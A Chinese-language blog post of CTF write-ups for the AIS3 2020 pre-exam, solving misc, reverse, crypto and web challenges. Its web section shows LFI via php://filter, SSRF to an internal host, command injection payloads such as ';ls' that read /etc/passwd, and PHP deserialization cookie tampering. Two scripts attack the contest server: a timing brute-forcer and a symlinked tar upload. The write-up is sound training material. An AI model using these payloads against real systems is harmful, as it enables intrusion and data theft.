---
title: AIS3 2020 Pre-exam Writeups
date: 2020-06-30 11:52:10
categories: 
- Security
tags:
- CTF
- AIS3 CTF
---
![ ](https://raw.githubusercontent.com/yctseng1227/AIS3_2020_pre-exam/master/pre-exam.ais3.org_index.png)

第一次參加為期三天AIS3 pre-exam，酷ㄛ > <
不過我這歲數來說好像有點晚了，看到好多高中生參賽不禁回憶自己高中到底在幹嘛www
平常在CTFTime的線上賽已經習慣找**stavhaygn**求開示，這次個人賽只能靠自己了 QwQ

<!--more-->

## Preface

先放上人權圖(Rank 113/427)，雖然成績不怎麼樣www
{% gp 2-2 %}
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/pre-exam.ais3.org_user.png?raw=true?400x)
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/pre-exam.ais3.org_challenges.png?raw=true?400x)
{% endgp %}

這份writeup基本上把300分以下的補完了，如果有其他建議還請不吝指教。
（各題原始分數為500分，根據CTFd的計分規則，題目到180人解就會降到最底100分。）

### 官方Writeups

- [Misc](https://github.com/frozenkp/CTF/tree/master/2020/AIS3_pre-exam)
- [Reverse](http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/)
- [Pwn](https://github.com/ss8651twtw/ais3-pre-exam-2020)
- [Crypto]()
- [Web](https://github.com/djosix/AIS3-2020-Pre-Exam)


## Misc

### 💤 Piquero (100 points, 347 solves)

#### Description
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/Piquero%20-%20100/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg?raw=true)
#### Solution
利用線上工具 [Braille Decoder](https://www.dcode.fr/braille-alphabet) 即可，要注意的是點字的大寫規則(.a = A)，包含我在內很多人的錯誤率都從這邊來的XD 
若想瞭解一下細節不妨可以參考 [啾啾鞋 - ⠓⠥⠈⠨⠐⠙⠌⠂⠙⠯⠈⠙⠞⠈⠓⠱⠐⠕](https://youtu.be/1aop1ursHVE)。

### 🐥 Karuego (100 points, 245 solves)
#### Description

題目給了一張Karuego圖（捏他「入間同學入魔了！」），想玩的請自取 [HERE](https://github.com/yctseng1227/AIS3_2020_pre-exam/raw/master/misc/Karuego%20-%20100/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png)。

#### Solution

直覺就是圖片隱寫術(Steganography)，通常都會先用`binwalk`看看有沒有藏檔案，不過這裡我直接拿去丟`stegsolve`神器，從LSB不小心挖到奇怪的key，這才回頭用`foremost`找藏在圖片中的壓縮檔XD。

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/misc-ka01.png?raw=true)

#### Solution 2
賽後和stavhaygn聊才知道用`binwalk`找到壓縮檔後可以用KPA(known plaintext attack)工具[PKcrack](https://github.com/keyunluo/pkcrack)去爆密碼，在官方的Discord群組也有看到同樣說法，看來也是預期解之一。


### 🌱 Soy (139 points, 172 solves)
#### Description
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/Soy%20-%20139/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png?raw=true)

#### Solution

利用線上工具 [qrazybox](https://merricx.github.io/qrazybox/) 將QRcode還原。從QRcode長寬可知ver.2，至於 format info 可以透過 Error Correction Level 和 Mask Pattern 的找到和題目相同的組合，剩下就格子點一點就有Flag了。

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/misc-so01.png?raw=true) ![](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/misc-so02.png?raw=true)

### 👑 Saburo (359 points, 108 solves)

#### Description
題目需要nc到官方Server，透過輸入字串後會得到"Haha, you lose in xx milliseconds."，其中的xx是隨機變動的數字（同樣輸入字串"a"，回傳的數字範圍會在11-15浮動），透過測試會發現輸入越接近flag數字會越大，直到猜到flag為止。
PS. flag is printable characters with AIS3{…}

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/misc-sa01.png?raw=true)

#### Solution

對於要用來測試的table，考慮到flag除了英文字母及數字，可能還會有`{`, `}`, `_`之類的，可以利用python [string library](https://docs.python.org/2/library/string.html)。 之後逐步猜字，用統計的方式把table每個字元都測10遍找回傳ms最大的，如果最後抓不到回傳的數字代表戳到flag了XD。

另外還有一點，由於過程中需要不斷nc官方Server，因此需要特別用`conn.close()`關閉連線，不然跑久了會報錯，個人在這邊吃鱉一陣子...可見寫程式的習慣還是很重要的。

{% codeblock solve.py lang:python %}
from pwn import *
from string import *

table = list(ascii_letters+digits+punctuation)
#flag = "AIS3{A1r1ght_U_4r3_my_3n3nnies}"
flag = "AIS3{"

while True:
    max_val = 0
    target = ''
    for ch in table:
        payload = flag + ch
        max_local = 0
        for j in range(10):
            conn = remote("60.250.197.227", 11001)
            conn.recvuntil('Flag:')
            conn.sendline(payload)
            try:
                res = int(conn.recvline().split()[-2])
                conn.close()
            except:
                print(flag + ch)
                conn.close()
                sys.exit(0) 
            max_local = max(max_local, res)
    
        if max_local > max_val:
            target = ch
            max_val = max_local
    flag = flag + target
    print(flag)
{% endcodeblock %}

### 👿 Shichirou (Post-solved, 450 points, 65 solves)

#### Description
同樣是需要nc到官方Server，透過瞭解source code想辦法取得flag。

{% codeblock Shichirou_1869833657e9fef14ad2742e59bb96f4630db429.py lang:python %}
#!/usr/bin/env python3

import os
import sys
import tempfile
import subprocess
import resource

resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536))
os.chdir(os.environ['HOME'])

size = int(sys.stdin.readline().rstrip('\r\n'))
if size > 65536:
    print('File is too large.')
    quit()

data = sys.stdin.read(size)
with tempfile.NamedTemporaryFile(mode='w+', \\
                                suffix='.tar', delete=True, dir='.') as tarf:
    with tempfile.TemporaryDirectory(dir='.') as outdir:
        tarf.write(data)
        tarf.flush()
        try:
            subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
        except:
            print('Broken tar file.')
            raise

        try:
            a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
            b = subprocess.check_output(['/usr/bin/sha1sum',    \\
                                        os.path.join(outdir, 'guess.txt')])
            a = a.split(b' ')[0]
            b = b.split(b' ')[0]
            assert len(a) == 40 and len(b) == 40
            if a != b:
                raise Exception('sha1')
        except:
            print('Different.')
            raise

        print(open('flag.txt', 'r').readline())
{% endcodeblock %}

#### Solution

賽後聽**stavhaygn**說這題對**MacacaHub**算考古題... 來自去年金盾獎決賽= =
不過從遊記[108金盾獎決賽](https://yctseng1227.github.io/191116-108-cyber-security-competition/)看得出來我沒有參與到解題過程，可惡QwQ


簡單解釋一下上方的code:
- line 12 基本上就是輸入數字，即檔案大小。
- line 17, 18 輸入tar包裝檔案（可以利用pwntool），然後在line 23進行解包。
- line 29 - 36 針對官方Server的兩個檔案 `guess.txt` 和 `flag.txt` 進行sha1比對，若相同就吐出flag。

我起初乍看之下還以為是sha1 bypass，但我們並不能改變Server的檔案，那我們到底是要上傳啥哩？

關鍵就是 [**Symbolic link**](https://en.wikipedia.org/wiki/Symbolic_link)，有點像是建立捷徑的概念，把 `guess.txt` 和 `flag.txt` 連結在一起。

首先，在本地端用指令建立連結，透過`ls`查看。
```shell
$ ln -s flag.txt guess.txt
$ ls -al
lrwxrwxrwx ... guess.txt -> flag.txt
```

再來就是進行tar打包（無壓縮）。
```shell
$ tar cvf guess.tar guess.txt
```

如此我們就能得到一個tar檔案，再來把扣摳一摳就行了吧。

{% codeblock solve.py lang:python %}
from pwn import *

conn = remote('60.250.197.227', 11000)

with open('./guess.tar', 'rb') as f:
    tar = f.read()

num = len(tar)
conn.sendline(str(num))
conn.sendline(tar)
conn.interactive()
{% endcodeblock %}

BOOOOOOOM，RUN起來結果看起來是爛掉了。
![](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/misc/misc-sh01.png?raw=true)

從第四行看得出來 `guess.txt` 和 `flag.txt` 似乎不在同一個目錄中。
不過錯誤提示也把路徑告訴我們了，簡單講大guy長得像底下這樣。
```
/home/ctf/
├── flag.txt
├── tmp7lzztdlk
│   ├── guess.txt
```

那就把連結的部分刪掉重來一遍！
```shell
$ rm guess.txt guess.tar # 記得把舊檔砍掉
$ ln -s /home/ctf/flag.txt guess.txt
$ ls -al
lrwxrwxrwx ... guess.txt -> /home/ctf/flag.txt
$ tar cvf guess.tar guess.txt
```

再一次把py檔run起來就能拿flag了~

<!--
### 🧸 Clara (Unsolved, 500 points, 2 solves)
-->

## Reverse
### 🍍 TsaiBro (100 points, 281 solves)
#### Description

題目給了一份ELF檔 [TsaiBro](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/TsaiBro%20-%20100/TsaiBro?raw=true) 和一份密語(?) [TsaiSaid](https://raw.githubusercontent.com/yctseng1227/AIS3_2020_pre-exam/master/reverse/TsaiBro%20-%20100/TsaiBroSaid)。

#### Solution
題目幾乎同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同，差別在ELF檔內的table不同。

如果直接執行ELF檔，可以發現輸出除了第一句之外，之後的"發財..."會隨著輸入的字串而改變（如下），因此我們的目標就是要把題目另外附的密語還原成FLAG。
```shell
$ chmod +x ./TsaiBro # 給檔案可執行的權限
$ ./TsaiBro ha
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財......發財....發財...發財
$ ./TsaiBro haha
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財......發財....發財...發財.發財......發財....發財...發財.
$ ./TsaiBro hahaha
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財......發財....發財...發財.發財......發財....發財...發財.發財......發財....發財...發財
```

針對TsaiBro，我們打開IDA Pro好朋友版使用F5大法，可以發現程式內主要轉換的方式如下:
```c++
table = "56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234";
for ( i = 0; i < strlen(argv[1]); ++i ) {
    for ( j = 0; j <= 63; ++j ) {
        if ( table[j] == argv[1][i] ){
            printf(&byte_968, (unsigned int)(j / 8 + 1), "..........", (unsigned int)(j % 8 + 1), "...........");
            break;
        }
    }
}
```

針對輸入`argv[1]`的每個字元，程式會先查表(table)，然後分別算出 `j / 8 + 1` 個點 和  `j % 8 + 1`個點。
由此可知道我們可以反過來把密語中的"..."兩兩一組回推 `j` 再回頭查表就能把 FLAG 推出來了！

{% codeblock solve.cpp lang:cpp %}
#include <bits/stdc++.h>
using namespace std;

int main(){
    string s;
    fstream file;
    file.open("TsaiBroSaid", ios::in);
    getline(file, s);
    file >> s; // 把第一段"Terry...逆逆..." 吃掉🤪
    s = regex_replace(s, regex("發財"), " "); // 把"發財"用"空白"取代
    stringstream ss(s);
    vector<int> v;
    // 以空白作為切割點把"..."的數量存起來
    while( getline(ss, s, ' ') ){
        if(s.length()) v.push_back(s.length());
    }

    string table = 
    "56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234";
    for(int i=0; i<v.size(); i+=2){
        int idx = v[i+1] + (v[i]-1) * 8 - 1;
        cout << table[idx];
    }
    return 0;
}
{% endcodeblock %}

### 🎹 Fallen Beat (144 points, 171 solves)
#### Description

題目給了一份用JAVA寫的音樂遊戲 [Fallen Beat](https://github.com/yctseng1227/AIS3_2020_pre-exam/tree/master/reverse/Fallen%20Beat%20-%20144)，必須要達到 FC(Full Combo, 全音符皆有按到)才會給FLAG，事後聽說似乎是出自中大計概的期末project，好猛XDDD

遊戲方式如下
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-fa01.png?raw=true)

> P.S. **注意遊戲音量**，不過因為我的電腦喇叭爛掉所以我也沒開過聲音就是了wwwwww

#### Solution

如果遊戲方式只有單純`D, F, J, K`四鍵或許我還會拼拼看，不過加上`space`其實還蠻干擾的QwQ
既然這題分類都在Reverse，本來就不是給人直接玩出FLAG... 如果有誰錄手元我還是蠻期待的wwww
> 註: 「手元」指的是用錄影方式將實際遊玩指法紀錄起來

回歸正題，既然要逆jar，當然就找JAVA Decompiler，這裡我用 [JD-GUI](http://java-decompiler.github.io)，然後把jar扔進去觀察一下，雖然說class不多到處亂翻也會有線索，不過既然是FC結束才出現FLAG，自然可以往`PanelEnding.class`的方向挖，嗯就是有個FLAG放在那裡（笑）

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-fa02.png?raw=true)

利用關鍵字循線往下看... 果然還是會經過一些計算，不會這麼容易直接把FLAG給出來QQ 
仔細看一下可以發現我們還少了很重要的變數`cache`資訊。

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-fa03.png?raw=true)

這裡其實我卡了一小段時間，因為回追總是會在某個環節就追丟，可能也是自己對JAVA不太熟的緣故吧 = v =
最後還是讓我找到了一個文字檔`hell.txt`，看起來蠻像是遊戲用的譜面(?)

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-fa04.png?raw=true)

而關於這個`hell.txt`是個1475行的純數字檔，節錄開頭如下。

```
186
***** DATA
1
0
0
0
28
0
0
14
0
...
...
```

搭配前面所找到的FLAG的計算，該有的線索都有就能直接回推結果了。

{% codeblock solve.cpp lang:cpp %}
#include <bits/stdc++.h>
using namespace std;
int main(){
    string s;
    fstream file;
    file.open("./songs/gekkou/hell.txt", ios::in);
    getline(file, s); getline(file, s); // 把前兩段吃掉
    vector<int> cache;
    while( getline(file, s) ){
        stringstream ss(s);
        int num; ss >> num;
        cache.push_back(num);
    }

    int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 
    109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 
    71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 };
    int flag_len = sizeof(flag)/sizeof(flag[0]);
    for(int i=0; i<cache.size(); i++){
        flag[ i % flag_len ] ^= cache[i];
    }
    for(int i=0; i<flag_len; i++){
        cout << (char)flag[i];
    }

    return 0;
}
{% endcodeblock %}

#### Solution 2

和Lab朋友聊過才知道原來還有其他解法，就是直接用patch的方式改成無視FC，不過似乎還會被排版搞(?) 要再手動調位置。賽後官方Discord群組對話出現下面這張，如果真的有人手動FC看到這排版應該會哭出來吧XDDDDD

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-fa05.png?raw=true)

P.S. 歌曲小科普（待補）

### 🧠 Stand up!Brain (455 points, 62 solves)

#### Description

這題給了一份ELF檔 [joke](https://github.com/yctseng1227/AIS3_2020_pre-exam/raw/master/reverse/Stand%20up!Brain%20-%20455/joke)，並且在引言中表示「這次輪到你說個笑話來聽聽了」。

#### Solution

（細節待補）

其實原本想照IDA Pro的規則先手動推推看，沒想到就把「笑話」推出來了 ㄏ

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/reverse/rev-st01.jpg?raw=true)

<!--
### 🍹 Long Island Iced Tea (Unsolved, 498 points, 15 solves)

### 🌹 La vie en rose (Unsolved, 499 points, 12 solves)

### 🐉 Uroboros (Unsolved, 500 points, 9 solves)

-->

## Pwn
部分題目需要召喚 **stavhaygn**'s writeup (`・ω・´)

### 👻 BOF (100 points, 189 solves)

#### Description

（待補）

#### Solution

（待補）

<!--
### 📃 Nonsense (Unsolved, 474 points, 47 solves)

### 🔫 Portal gun (Unsolved, 491 points, 28 solves)

### 🏫 Morty school (Unsolved, 498 points, 14 solves)

### 🔮 Death crystal (Unsolved, 499 points, 10 solves)

### 📦 Meeseeks box (Unsolved, 500 points, 8 solves)

-->

## Crypto

### 🦕 Brontosaurus (100 points, 380 solves)

#### Description

題目給了一份字數多達42k的純文字檔 [HERE](https://raw.githubusercontent.com/yctseng1227/AIS3_2020_pre-exam/master/crypto/Brontosaurus%20-%20100/KcufsJ)，以下僅節錄開頭一部分。

{% codeblock KcufsJ line_number:false %}
)()]]][+[+][+!+][+![)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]]][+!+][+![+][+!+[)(]]][+!+[)][+][!!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+!+][+![)][+]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][(+]][+[)][+]
...
...
...
{% endcodeblock %}

#### Solution

事後發現題目同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。
不過當下其實就看得出是`JSFuck`（被身邊朋友荼毒過了Zzzzz），只是直接複製到 jsfuck decoder 會失敗，正當我覺得納悶的時候才發現字首是 `)`，索性開python做字串反轉`[::-1]`，再一次decode就有flag了~

> 事後和沒有參加pre-exam的朋友分享才被點出檔名"KcufSJ"就提示要反轉了XD

### 🦖 T-Rex (100 points, 381 solves)

#### Description

題目同樣給了一份純文字檔 [HERE](https://raw.githubusercontent.com/yctseng1227/AIS3_2020_pre-exam/master/crypto/T-Rex%20-%20100/prob)，而且也不難看出上半部和下半部之間的關聯。

```
        !       @       #       $       %       &

!       V       F       Y       J       6       1

@       5       0       M       2       9       L

#       I       W       H       S       4       Q

$       K       G       B       X       T       A

%       E       3       C       7       P       N

&       U       Z       8       R       D       O

&$ !# $# @% { %$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## !# &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $% ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @@ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &# && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# %& %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$ }
```

#### Solution

簡單講就是查表回推flag，只是在群組真的聽到不少人直接用紙筆硬推（而且還推歪），怕爆。
既然都身為資訊科系寫個程式不為過吧 XDDDD

{% codeblock solve.cpp lang:cpp line_number:false %}
#include <bits/stdc++.h>
using namespace std;
int main(){
    map<char, int> dict = { {'!',0}, {'@',1}, {'#',2}, {'$',3}, {'%',4}, {'&',5} };
    string table[6] = {"VFYJ61", "50M29L", "IWHS4Q", "KGBXTA", "E3C7PN", "UZ8RDO"};
    stringstream ss("&$ !# $# @% { %$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## !# &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $% ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @@ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &# && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# %& %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$ }");
    string s;
    while( getline(ss, s, ' ') ){
        if(s.length() == 1) cout << s;
        else                cout << table[ dict[s[1]] ][ dict[s[0]] ];
    }
    return 0;
}
{% endcodeblock %}

看看這充滿惡意的flag... 根本就沒打算讓人用手推XDDDDD
> AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}

<!--
### 🐙 Octopus (Unsolved, 372 points, 103 solves)

### 🐡 Blowfish (Unsolved, 480 points, 42 solves)

### 🐪 Camel (Unsolved, 497 points, 18 solves)

### 🐢 Turtle (Unsolved, 498 points, 14 solves)

-->

## Web

### 🦈 Shark (100 points, 261 solves)

#### Description

打開畫面後有個Link `Shark never cries?`，點開如下。
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sh01.png?raw=true)

#### Solution

題目幾乎同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。
雖說如此，我在Day1戳半天戳不出結果，到Day2才發現考古題這件事 XD

首先，從Link的後綴可以觀察到`?path=hint.txt`，基本上可以聯想到`LFI`相關的題型，透過幾個基本的 `php://filter` 嘗試撈出source code。
例如 `php://filter/convert.base64-encode/resource=index.php`，把拿到的base64還原可以得到下面code。

{% codeblock lang:php %}
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>🦈🦈🦈</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>🦈🦈🦈</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>
{% endcodeblock %}


不過看起來沒有我們想要的資訊，只知道檔了很多存取目錄的方式，而確定`php://filter`方法可行。
再來就是題目一開始給的提示"Please find the other server in the internal network! (flag is on that server)"
那就來翻翻看 `/etc/hosts`... 不過沒有我們要的資訊。

Day1我就就卡在這裡，直到找到去年writeup才發現有`/proc/net/fib_trie`可查到內網的ip位址。
```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3             <--- WE ARE HERE
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
 
```

之後就照著writeup走，找找`172.22.0.3`附近的ip，例如 `172.22.0.2`。
最後直接 `?path=http://172.22.0.2/flag` 就能拿flag了 ~

### 🐿 Squirrel (Post-solved, 100 points, 220 solves)

#### Description

點進連結 畫面就是一堆松鼠帶著系統目錄跑來跑去...

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq01.png?raw=true)

題外話... 同樣用Chrome不同系統看的emoji都不太一樣 蠻有趣的wwwww

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq02.png?raw=true)

#### Solution

解題人數明明破200位，但直到競賽結尾我還是沒解出來，事後證明我想太多了 QwQ

首先，從網頁source code可以看到些許端倪。
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq03.png?raw=true)

透過網址後綴 `/api.php?get=/etc/passwd` 可以撈到一些資訊，但這題看起來是沒什麼用。
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq04.png?raw=true)

基本上賽中我這裡就卡住了，一直想從網頁source code 的 Error Handling 下手 ...

其實，仔細想一下就可以發現，`?get=` + `file name` 能夠查看檔案內容... 那就不就是command `cat`嗎!!!!
既然如此，那來看看`cat api.php`應該也沒有問題吧!

透過網址後綴 `/api.php?get=api.php` 還真的把 `api.php` source code 撈出來了XD
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq05.png?raw=true)

從這份source code可以看到是用`shell_exec`執行指令，並且用 `'` 前後閉合起來。
那我們下一步就能利用 command injection 的 `;` 截斷執行我們想要的command ~
例如 `/api.php?get=';ls'`，記得要加上 `'` 將前後閉合ㄛ （同SQLi的概念）
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq06.png?raw=true)

能夠列出當前目錄，那就能繼續深入找找是否有些好玩的東西(?)
例如 `/api.php?get=';ls ../../../'` 好像... 有個可疑的檔案？
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq07.png?raw=true)

嘿嘿那就來看看裡面有沒有flag吧！ 
開心使用 `/api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt'`，有了!!!

不過打了這麼長一串... 是不是忘記那個 `?get=` 其實就等同 `cat` 功能 www
直接在後面接目錄檔名就行了 `/api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sq08.png?raw=true)

### 🐘 Elephant (168 points, 165 solves)

#### Description

點進連結，可以看到是個登入頁面（還有需要反白的彩蛋??）
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-el01.png?raw=true)

隨意輸入後，下方說明文字說明token不足以讀flag（同樣有需要反白的彩蛋??）

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-el02.png?raw=true)

#### Solution

這題當初真的是超乎預期地通靈拿到flag，完全不明白考點在哪 = =

> 「所以才說有些題目就是知識斷片，才要用通靈的方式跳上去」 by 逆逆

因此賽後找了**stavhaygn**完整還原一下這題的重點。

首先簡單講個人的通靈解法 XD
登入後可以把cookies的字串拿去base64 decode得到下列字串。

```
O:4:"User":2:{s:4:"name";s:4:"haha";s:11:"Usertoken";s:32:"6cdc79ae4ac3bd4ade8162dc68d2d50d";}
```

格式上看得出是`type:length:data`，但我發現中間的`s:11:"Usertoken"`... 算算長度應該是 9 吧(?)
嗯。我就真的手動改成`s:9:"Usertoken"`再base64 encode後填回去cookies，重新整理頁面後就噴flag了...

（？？？黑人問號）

其實上面的字串格式叫做「序列化(serialization)」，我平常沒什麼摸真的不太瞭解 www

正確的作法應該是從`/.git`，可以發現並非 404 not found 而是 403 forbidden。
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-el03.png?raw=true)

利用[GitHack](https://github.com/lijiejie/GitHack)，把檔案還原出來。
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-el04.png?raw=true)

{% codeblock index.php lang:php%}
<?php

const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');

class User {
    public $name;
    private $token;
    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }
    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}

$user = NULL;
if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}
{% endcodeblock %}

這份source code有幾個重點:
- line 8 token的類別定義為`private` (稍後會提到)
- line 11 token產生的方式為Random + MD5 Hash
- line 14 拿flag的條件: `$flag == $this->token`
- line 28 serialize function

這題關鍵在`strcmp bypass`。
而`$flag`寫在後端無法修改，我們也沒辦法控制token的random值。
從網路找的資訊為`strcmp`在遇到**字串**和**陣列**比較時將回傳NULL，利用PHP的弱型別特性 `NULL == 0` 會成立。

那我們不就只要把拿到的序列化字串手動修改不就行了嗎 ~

```
O:4:"User":2:{s:4:"name";s:4:"haha";s:11:"Usertoken";a:0:{};}
```

很遺憾... 不行。如果改完再encode貼到cookies會被登出。
問題在於一些程式產生的**不可視字元**，同時也是我一開始發現字串長度很奇怪的部分。

關於PHP序列化格式，可以參考這篇 [一文让PHP反序列化从入门到进阶](https://xz.aliyun.com/t/6753)
其中類別中的三種權限的表示方式:
> public: `data`
> private: %00`class name`%00`member name`
> protected: %00*%00`member name`

也能夠說明為何我看到的字串長度少 2（`%00` * 2），同時也無法直接修改。


